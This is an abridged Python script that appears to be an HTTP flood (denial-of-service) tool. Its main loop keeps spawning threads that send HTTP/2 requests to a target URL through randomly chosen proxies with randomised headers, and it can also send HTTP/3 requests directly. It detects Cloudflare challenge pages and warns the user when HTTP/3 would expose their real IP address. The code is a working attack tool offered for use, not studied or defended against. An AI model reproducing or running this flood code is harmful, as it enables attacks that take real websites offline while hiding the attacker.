...
try:
    ...
    print("\033[01;31m[!] httpx not installed. HTTP/2 and HTTP/3 features will be disabled.\033[0m")
...
def http2(url, proxy):
    ...
    try:
        ...
        with httpx.Client(proxies=proxies, http2=True, verify=False) as client:
            resp = client.get(url, headers=generate(), timeout=7.0)
            
            cod = f"\033[0m{resp.status_code}\033[0m" if (100 <= resp.status_code <= 199) else f"\033[01;32m{resp.status_code}\033[0m" if (200 <= resp.status_code <= 299) else f"\033[01;33m{resp.status_code}\033[0m" if (300 <= resp.status_code <= 399) else f"\033[01;31m{resp.status_code}\033[0m" if (400 <= resp.status_code <= 499) else f"\033[01;35m{resp.status_code}\033[0m"
            
            if (b"<title>Just a moment...</title>" in resp.content and b"Enable JavaScript and cookies to continue" in resp.content) or b"<title>Attention Required! | Cloudflare</title>" in resp.content:
                print(f"{proxy}: request sent over \033[01;36mHTTP/2\033[0m ({cod}), size {len(resp.content)} B (\033[01;31mcloudflare\033[0m)")
            else:
                print(f"{proxy}: request sent over \033[01;36mHTTP/2\033[0m ({cod}), size {len(resp.content)} B")
    except:
        pass
...
def http3(url, proxy):
    ...
    try:
        # HTTP/3 tidak mendukung proxy di httpx
        with httpx.Client(http3=True, verify=False) as client:
            resp = client.get(url, headers=generate(), timeout=7.0)
            
            cod = f"\033[0m{resp.status_code}\033[0m" if (100 <= resp.status_code <= 199) else f"\033[01;32m{resp.status_code}\033[0m" if (200 <= resp.status_code <= 299) else f"\033[01;33m{resp.status_code}\033[0m" if (300 <= resp.status_code <= 399) else f"\033[01;31m{resp.status_code}\033[0m" if (400 <= resp.status_code <= 499) else f"\033[01;35m{resp.status_code}\033[0m"
            
            if (b"<title>Just a moment...</title>" in resp.content and b"Enable JavaScript and cookies to continue" in resp.content) or b"<title>Attention Required! | Cloudflare</title>" in resp.content:
                print(f"direct: request sent over \033[01;36mHTTP/3\033[0m ({cod}), size {len(resp.content)} B (\033[01;31mcloudflare\033[0m)")
            else:
                print(f"direct: request sent over \033[01;36mHTTP/3\033[0m ({cod}), size {len(resp.content)} B")
    except:
        pass
...
def main():
    try:
        ...
        # Tanyakan apakah ingin menggunakan HTTP/3
        use_http3 = False
        if HTTPX_AVAILABLE:
            http3_choice = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Use HTTP/3 without proxy? (y/n):\033[01;34m ")).lower()
            use_http3 = http3_choice == 'y'
            if use_http3:
                print("\033[01;31m[!] WARNING: HTTP/3 will expose your real IP address!\033[0m")
        ...
        while True:
            ...
            if method == 'http':
                ...
                threading.Thread(target=http2, args=(url, random.choice(working)), daemon=True).start()
            elif method == 'http3':
                threading.Thread(target=http3, args=(url, random.choice(working)), daemon=True).start()
